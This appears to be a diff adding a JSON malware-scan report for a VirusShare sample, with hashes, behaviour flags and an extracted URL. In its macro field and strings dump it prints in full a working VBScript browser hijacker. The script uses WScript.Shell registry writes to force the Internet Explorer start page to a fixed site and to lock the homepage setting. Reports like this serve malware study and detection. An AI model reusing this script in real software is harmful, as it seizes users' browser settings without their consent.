@@ -1,0 +1,67 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "Option Explicit\n'Declare variables\nDim WSHShell, n, erro, ppp, shl, MyBox, p, p1, p2, t, errnum, vers, http, hns\nDim aut, enab, disab, jobfunc, itemtype, site, Master, net, jj\nhns = \"www.e-muladores.net\"\nhttp = \"http:/\"\njj = \"Format\"\nSite = \"/www.e-mu\"\naut= \"et\"\nMaster = \"ladores\"\nerro = \" C:/\"\nnet = \".n\"\nppp = shl\nshl = \"  - www.e-muladores.net\"\nIf master = \"ladores\" then\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\np = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\\"\np = p & \"Start Page\"\nn = http+Site + Master+net+aut'http://www.e-muladores.net Coloque seu site aqui se n\ufffdo funcionar baixe movamente\nWSHShell.RegWrite p, n \np1 = \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\"\np1 = p1 & \"HomePage\"\nitemtype = \"REG_DWORD\"\np2 = \"1\"\nWSHShell.RegWrite p1, p2, itemtype\nMSGBOX (shl)\nElse\nMsgbox (jj+erro+shl)\nEnd IF"
+    },
+    "filename": "VirusShare_0b60cc1ff38239ebbb091a1cd75b5d97",
+    "filesize": 901,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0b60cc1ff38239ebbb091a1cd75b5d97",
+        "sha1": "a02f9e2f5da8c31644dbfcdd47e936c484d1b837",
+        "sha256": "3b73ff4496717b8a6a45c4bdf63493c8ed3a38c53094179cd557381415d0e6c5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Option Explicit",
+            "'Declare variables",
+            "Dim WSHShell, n, erro, ppp, shl, MyBox, p, p1, p2, t, errnum, vers, http, hns",
+            "Dim aut, enab, disab, jobfunc, itemtype, site, Master, net, jj",
+            "hns = \"www.e-muladores.net\"",
+            "http = \"http:/\"",
+            "jj = \"Format\"",
+            "Site = \"/www.e-mu\"",
+            "aut= \"et\"",
+            "Master = \"ladores\"",
+            "erro = \" C:/\"",
+            "net = \".n\"",
+            "ppp = shl",
+            "shl = \"  - www.e-muladores.net\"",
+            "If master = \"ladores\" then",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "p = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\\"",
+            "p = p & \"Start Page\"",
+            "n = http+Site + Master+net+aut'http://www.e-muladores.net Coloque seu site aqui se no funcionar baixe movamente",
+            "WSHShell.RegWrite p, n ",
+            "p1 = \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\"",
+            "p1 = p1 & \"HomePage\"",
+            "itemtype = \"REG_DWORD\"",
+            "p2 = \"1\"",
+            "WSHShell.RegWrite p1, p2, itemtype",
+            "MSGBOX (shl)",
+            "Else",
+            "Msgbox (jj+erro+shl)",
+            "End IF"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.e-muladores.net"
+        ]
+    },
+    "time": "0:00:00.275385",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
